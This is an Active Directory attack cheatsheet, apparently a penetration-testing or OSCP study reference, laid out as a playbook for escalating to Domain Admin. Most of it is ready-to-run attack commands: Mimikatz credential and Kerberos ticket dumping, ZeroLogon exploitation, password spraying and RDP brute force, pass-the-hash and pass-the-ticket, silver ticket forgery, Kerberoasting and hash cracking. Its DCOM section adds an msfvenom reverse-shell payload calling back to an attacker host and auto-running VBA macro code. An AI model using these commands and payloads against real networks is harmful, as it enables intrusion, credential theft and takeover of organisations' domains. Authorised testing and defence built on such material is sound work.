# Active Directory Cheatsheet

### [AD Enumeration](#AD-Enumeration-1) 
* Users / Groups / Computers
* Domain Controller
* Service Principal Names (SPNs)
* Logged-in Users and Active User Sessions

### [AD Authentication](#AD-Authentication-1)
* Dumping NTLM hashes and Plaintext Credentials
* Dumping Kerberos tickets

### [AD Lateral Movement](#AD-Lateral-Movement-1) 
* ZeroLogon Vulnerability
* Password Spraying
* Plaintext Credentials
* Service Account Attacks
* Pass-the-Hash
* Overpass-the-Hash
* Pass-the-Ticket
* Silver Tickets
* Distributed Component Object Model (DCOM)

### [Hash Cracking Techniques](#Hash-Cracking-Techniques-1)
* Cracking NTLM hashes
* Kerberoasting

## AD Introduction

Goal:
1. Perform user hunting to track down where users are logged into in the network - find users that are members of high-value groups.
2. Dump credentials and/or obtain Kerberos tickets.
3. Gain access to the user's machine using creds/ticket.
4. (Possibly) escalate privileges in the machine.
5. Repeat steps above until you have administrative privileges in the Domain Controller.

## AD Enumeration

Users / Groups / Computers
* Look for users with high-privs across the domain e.g. Domain Admins or Derivative Local Admins
* Look for custom groups.
```powershell
# get all users in the domain
cmd> net user /domain
cmd> net user [username] /domain

# get all groups in the domain
cmd> net group /domain
cmd> net group [groupname] /domain

# get all computers in domain
cmd> net view
cmd> net view /domain

# get resources/shares of specified computer
cmd> net view \\[computer_name] /domain
```

Domain Controller hostname (PdcRoleOwner)**
```powershell
PS> [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
```

Service Principal Names (AD Service Accounts)
* A SPN is a unique name for a service on a host, used to associate with an Active Directory service account.
* Enum SPNs to obtain the IP address and port number of apps running on servers integrated with Active Directory.
* Query the Domain Controller in search of SPNs.
* SPN Examples
  * `CIFS/MYCOMPUTER$` - file share access.
  * `LDAP/MYCOMPUTER$` - querying AD info via. LDAP.
  * `HTTP/MYCOMPUTER$` - Web services such as IIS.
  * `MSSQLSvc/MYCOMPUTER$` - MSSQL.
* Perform `nslookup` of the service hostname -> see if there is an entrypoint here.
* Automated SPN enum scripts:
```powershell
# Kerberoast: https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.ps1
PS> .\GetUserSPNs.ps1

# Powershell Empire: https://github.com/compwiz32/PowerShell/blob/master/Get-SPN.ps1
PS> .\Get-SPN.ps1
```

Logged-in users and active user sessions.
* More powerview commands https://book.hacktricks.xyz/windows/basic-powershell-for-pentesters/powerview
```powershell
PS> Set-ExecutionPolicy Unrestricted
PS> Import-Module .\PowerView.ps1
PS> Get-NetLoggedon -ComputerName [computer_name]    # enum logged-in users
PS> Get-NetSession -ComputerName [domain_controller] # enum active user sessions
```

## AD Authentication

### Dumping NTLM Hashes and Plaintext Credentials

NTLM authentication uses a challenge-response model, where a nonce/challenge encrypted using the user's NTLM hash is validated by the Domain Controller.

Dumping LM/NTLM hashes with Mimikatz
* [Full Mimikatz Guide](https://adsecurity.org/?page_id=1821#SEKURLSALogonPasswords)
* Requires local admin rights.
```powershell
# escalate security token to SYSTEM integrity
mimikatz > privilege::debug
mimikatz > token::elevate

# dump NTLM hashes + plaintext creds
mimikatz > lsadump::sam              # dump contents of SAM db in current host
mimikatz > sekurlsa::logonpasswords  # dump creds of logged-on users
```

Other tools
```powershell
cmd> pwdump.exe localhost
cmd> fgdump.exe localhost          # improved pwdump, shutdown firewalls 
cmd> type C:\Windows\NTDS\NTDS.dit # all domain hashes in NTDS.dit file on the Domain Controller
```

### Dumping Kerberos Tickets

Kerberos authentication uses a ticketing system, where a Ticket Granting Ticket (TGT) is issued by the Domain Controller (with the role of Key Distribution Center (KDC)) and is used to request tickets from the Ticket Granting Service (TGS) for access to resources/systems joined to the domain.
* Hashes are stored in the Local Security Authority Subsystem Service (LSASS).
* LSASS process runs as SYSTEM, so we need SYSTEM / local admin to dump hashes stored on target.

Dumping Kerberos TGT/TGS tickets with Mimikatz
```
mimikatz > sekurlsa::tickets
```

See "Service Account Attacks" on how to abuse dumped tickets.


## AD Lateral Movement

Useful Powershell one-liners:
* https://gist.github.com/jivoi/c354eaaf3019352ce32522f916c03d70

Useful lateral movement techniques:
* https://www.n00py.io/2020/12/alternative-ways-to-pass-the-hash-pth/

Abusing Kerberos using Impacket:
* https://www.hackingarticles.in/abusing-kerberos-using-impacket/

Kerberos attack cheatsheet:
* https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a#kerberos-cheatsheet

### ZeroLogon Vulnerability

Try Zerologon (requires reset after use as account pw is set to empty)
* Source: https://github.com/risksense/zerologon
* Affects ALL Windows Server versions, but we want to target DCs (high-value).
```bash
# set computer account password to an empty string.
$ python3 set_empty_pw.py [dc_computername] [dc_ip]
$ python3 set_empty_pw.py xor-dc01 10.11.1.120 

# dump domain creds
$ python secretsdump.py -hashes :[empty_password_hash] '[domain]/[dc_computername]$@[dc_ip]'
$ python secretsdump.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 'xor/xor-dc01$@x.x.x.x'
```

### Password Spraying
* Dumped plaintext cred or cracked hash for your user?
* However, no creds/hashes for other users/SPN to use for lateral movement?
* Does the plaintext cred follow some pattern? e.g. `IAmUser01, IAmUser02 ...`
* Use `spray-passwords.ps1` script: https://github.com/ZilentJack/Spray-Passwords/blob/master/Spray-Passwords.ps1
```powershell
# test password against all users in the AD, including admins.
PS> .\spray-passwords.ps1 -Admin -Pass IamUser01
PS> .\spray-passwords.ps1 -Admin -Pass IamUser02
...
```

If there are too many users/passwords to manually each cred against RDP, use Hydra to bruteforce RDP:
* As not all users are part of the "NT AUTHORITY\REMOTE INTERACTIVE LOGON" group.
```
$ hydra -L users.txt -P pass.txt rdp://[target]
```

### Plaintext Credentials
```bash
# RDP clients
$ rdesktop [target] -d [domain] -u [user] -p [password]
$ remmina -c rdp://[username]:[password]@[target]

# WinRM client (used in compromised computer) - ensure WSMAN port 5985 is open on target
PS> winrm quickconfig                                               # start winrm service
PS> winrm set winrm/config/Client @{AllowUnencrypted = "true"}      # allow HTTP
PS> Set-Item WSMan:localhost\client\trustedhosts -value *           # trust all hosts
cmd> winrs -u:[username] -p:[password] -r:http://[target]:5985/wsman "cmd" # execute command

# Admin groups but with a "MANDATORY LABEL\MEDIUM" context?
# Try UAC bypass technique.
# See https://github.com/brianlam38/OSCP-2022/blob/main/cheatsheet-main.md#user-account-control-uac-bypass
```

### Service Account Attacks

Service account attacks
* If we know the `serviceprincipalname` value from prior AD enum, we can target the SPN by by requesting a service ticket for it from the Domain Controller and access resources from the service with our own ticket.
```powershell
# request service ticket
PS> Add-Type -AssemblyName System.IdentityModel
PS> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken \
        -ArgumentList '[service_principal_name]'

# export cached tickets
mimikatz > kerberos::list /export
```

Crack SPN hashes
```bash
# Kerberoast
$ python3 tgsrepcrack.py rockyou.txt [ticket.kirbi]  # locally crack hashes
PS> Invoke-Kerberoast.ps1                            # crack hashes on target

# John the Ripper
$ python3 kirbi2john.py -o johncrackfile ticket.kirbi  # convert ticket to john file
$ john --wordlist=rockyou.txt johncrackfile
```

### Pass-the-Hash
(NTLM based AuthN)
* Requires user/service account to have local admin rights on target, as connection is made using the `Admin$` share.
* Requires SMB connection through the firewall
* Requires Windows File and Print Sharing feature to be enabled.
```bash
# Method 1
$ pth-winexe -U [domain]/[username]%[blank_hash]:[ntlm_hash] //[target] [command_to_exec]
$ pth-winexe -U xor/Administrator%aad3b435b51404eeaad3b435b51404ee:08df31234567890bf6 //10.1.1.1 cmd.exe
^OR try without domain prefix in -U flag

# Method 2
$ python wmiexec.py Administrator@[target] -hashes [LM]:[NT/NTLM]
$ python wmiexec.py Administrator@10.11.1.22 -hashes [leavebankifnoLM]:ee12345067801f38115019ca2fb

# Method 3
$ python psexec.py [username]@[target] -hashes :[NT/NTLM]

# Method 4 - RDP PTH
$ xfreerdp /u:Administrator /pth:[NTLM hash] /d:[domain] /v:[target]
^If error occurs "Account Restrictions are preventing this user from signing in.” enable Restricted Admin Mode:
$ crackmapexec smb [target] -u [username] -H [hash] -x 'reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f'

# Method 5 - see guide https://www.ivoidwarranties.tech/posts/pentesting-tuts/cme/crackmapexec/
$ crackmapexec smb [target] -u [username] -H [hash] -x "whoami" 
```

### Overpass-the-Hash
(NTLM Hash -> Kerberos-based AuthN)
* Attack path: obtain a user's NTLM hash -> start new cmd/ps process as user -> request Kerberos TGT as user -> code exec on any machine where the user has permissions.
* Requirement: user/service account to have local admin on target machine.
* Useful when Kerberos is the only authentication mechanism allowed in a target (NTLM authN disabled).
* `psexec.exe` requires local admin rights as it accesses admin$ share.
* NOTE: We can only use the TGT on the machine it was created for.

OPTH via. COMPROMISED HOST
```powershell
### WITH MIMIKATZ ON COMPROMISED HOST
mimikatz > sekurlsa::logonpasswords    # obtain NTLM hash
mimikatz > sekurlsa::pth               # create new PS process in context of target user
        /user:[user_name] 
        /domain:[domain_name]
        /ntlm:[hash_value]
        /run:PowerShell.exe

# (new PS window, but on same host)
PS> klist # should show no TGT/TGS
PS> net use \\dc01 (try other comps/targets) # generate TGT by authN to network share on the computer
PS> klist # now should show TGT/TGS
PS> .\PsExec.exe \\[computer] cmd.exe  # use TGT to perform code exec against
                                       # target which user has permissions on.
                                       # (as Psexec does not accept hashes)
```

OPTH via. KALI
```bash
# [OPTION 1 TICKET RETRIEVAL] Request the TGT with hash
$ python getTGT.py <domain_name>/<user_name> -hashes [lm_hash]:<ntlm_hash>
# Request the TGT with aesKey (more secure encryption, probably more stealth due is the used by default by Microsoft)
$ python getTGT.py <domain_name>/<user_name> -aesKey <aes_key>
# Request the TGT with password
$ python getTGT.py <domain_name>/<user_name>:[password]
# If not provided, password is asked

# [OPTION 2 TICKET RETRIEVAL] export tickets -> copy to Kali
mimikatz> sekurlsa::tickets /export                             
cmd> copy [ticket.kirbi] \\192.168.119.XXX\share\[ticket.kirbi]
# use ticket_converter.py to convert .kirbi to .ccache
# https://github.com/Zer1t0/ticket_converter
$ python ticket_converter.py ticket.kirbi ticket.ccache

# Set the TGT for impacket use
$ export KRB5CCNAME=<TGT_ccache_file>

# execute remote commands with any of the following by using the TGT
$ python psexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
$ python smbexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
$ python wmiexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
```

### Pass-the-Ticket
(Kerberos-based AuthN)

Pass-the-Ticket takes advantage of the TGS by exporting service tickets, injecting them into memory (on target) or caching as environment variable (on Kali) and then authenticating with the injected/cached ticket via. Kerberos-based authN as opposed to NTLM-based authN.
* This attack does not require the service/user to have local admin rights on the target.

PTT via. COMPROMISED HOST (exporting -> inject into memory -> psexec.exe)
```powershell
# METHOD 1: Mimikatz
mimikatz> sekurlsa::tickets /export          # export tickets
mimikatz> kerberos::ptt [ticket_name.kirbi]  # inject into memory
cmd> psexec.exe \\target.hostname.com cmd    # authN to remote target using ticket

# METHOD 2: Rubeus
cmd> Rubeus.exe asktgt /domain:<domain_name> /user:<user_name> /rc4:<ntlm_hash> /ptt
```

PTT via. KALI (exporting -> cache as env var -> psexec.py/smbexec.py/wmiexec.py)
```bash
# export tickets -> copy to Kali
mimikatz> sekurlsa::tickets /export                             
cmd> copy [ticket.kirbi] \\192.168.119.XXX\share\[ticket.kirbi]

# use ticket_converter.py to convert .kirbi to .ccache
# https://github.com/Zer1t0/ticket_converter
$ python ticket_converter.py ticket.kirbi ticket.ccache

# Set the ticket for impacket use
export KRB5CCNAME=<TGT_ccache_file_path>

# Execute remote commands with any of the following by using the TGT
python psexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
python smbexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
python wmiexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
```

### Silver Ticket

Silver Tickets enable an attacker to create forged service tickets (TGS tickets)
* In this attack, user/group permissions in a Service Ticket are blindly trusted by the application on a target server running in the context of the service account. We forge our own Service Ticket (Silver Ticket) to access the resource (e.g. IIS app, MSSQL app) with any permissions we want. If the SPN/service account is used across multiple servers, we can leverage our Silver Ticket against all.
* Walkthrough of PTT via. compromised MSSQLSvc hash: https://stealthbits.com/blog/impersonating-service-accounts-with-silver-tickets/

SILVER TICKET via. COMPROMISED HOST
```powershell
# obtain SID of domain (remove RID -XXXX) at the end of the user SID string.
cmd> whoami /user
corp\offsec S-1-5-21-1602875587-2787523311-2599479668[-1103]

# generate the Silver Ticket (TGS) and inject it into memory
mimikatz > kerberos::golden /user:[user_name] /domain:[domain_name].com /sid:[sid_value] 
        /target:[service_hostname] /service:[service_type] /rc4:[hash] /ptt
        
# abuse Silver Ticket (TGS)
cmd> psexec.exe -accepteula \\<remote_hostname> cmd   # psexec
cmd> sqlcmd.exe -S [service_hostname]                 # if service is MSSQL
```

SILVER TICKET via. KALI
```bash
# generate the Silver Ticket with NTLM
$ python ticketer.py -nthash <ntlm_hash> -domain-sid <domain_sid> -domain <domain_name> -spn <service_spn>  <user_name>

# set the ticket for impacket use
$ export KRB5CCNAME=<TGT_ccache_file_path>

# execute remote commands with any of the following by using the TGT
$ python psexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
$ python smbexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
$ python wmiexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
```

### Distributed Component Object Model (DCOM)
* DCOM allows a computer to run programs over the network on a different computer e.g. Excel/PowerPoint/Outlook
* Requires RPC port 135 and local admin access to call the DCOM Service Control Manager - the API.
* The `run` method within DCOM allows us to execute a VBA macro remotely.

DCOM - create payload and VBA macro
```
# (kali) create rshell payload
$ msfvenom -p windows/shell_reverse_tcp LHOST=[kali] LPORT=4444 -f hta-psh -o evil.hta

# (python) split payload into smaller chunks starting with "powershell.exe -nop -w hidden -e
str = "powershell.exe -nop -w hidden -e {base64_encoded_payload}"
n = 50
for i in range(0, len(str), n):
print "Str = Str + " + '"' + str[i:i+n] + '"'

# create VBA macro -> insert into Excel file
Sub AutoOpen()
    exploit
End Sub
Sub Document_Open()
    exploit
End Sub
Sub exploit()
        Dim str As String
        {insert_payload_here}
        # OPTION 1
        Shell (Str)                    
        # OPTION 2
        # CreateObject("Wscript.Shell").Run str
End Sub

# check if document contains valid exploit macro
$ mraptor [exploit.doc]
```

DCOM - Copy file to remote and execute
```
# create instance of Excel.Application object
$com [activator]::CreateInstance([type]::GetTypeFromProgId("Excel.Application", "[target_workstation]"))

# copy Excel file containing VBA payload to target
$LocalPath = "C:\Users\[user]\badexcel.xls
$RemotePath = "\\[target]\c$\badexcel.xls
[System.IO.File]::Copy($LocalPath, $RemotePath, $True)

# create a SYSTEM profile - required as part of the opening process
$path = "\\[target]\c$\Windows\sysWOW64\config\systemprofile\Desktop"
$temp = [system.io.directory]::createDirectory($Path)

# open Excel file and execute macro
$Workbook = $com.Workbooks.Open("C:\myexcel.xls")
$com.Run("mymacro")
```


## Hash Cracking Techniques

Cracking NT (NTLM) hashes
```
$ hashcat -m 1000 -a 0 hashes.txt [path/to/wordlist.txt] -o cracked.txt
$ john --wordlist=[path/to/wordlist.txt] hashes.txt
```

Kerberoasting - Crack SPN hashes via. exported `.kirbi` tickets.
* Walkthrough: https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting
```
# Kerberoast
$ python3 tgsrepcrack.py rockyou.txt [ticket.kirbi]  # locally crack hashes
PS> Invoke-Kerberoast.ps1                            # crack hashes on target

# John the Ripper
$ python3 kirbi2john.py -o johncrackfile ticket.kirbi  # convert ticket to john file
$ john --wordlist=rockyou.txt johncrackfile
```


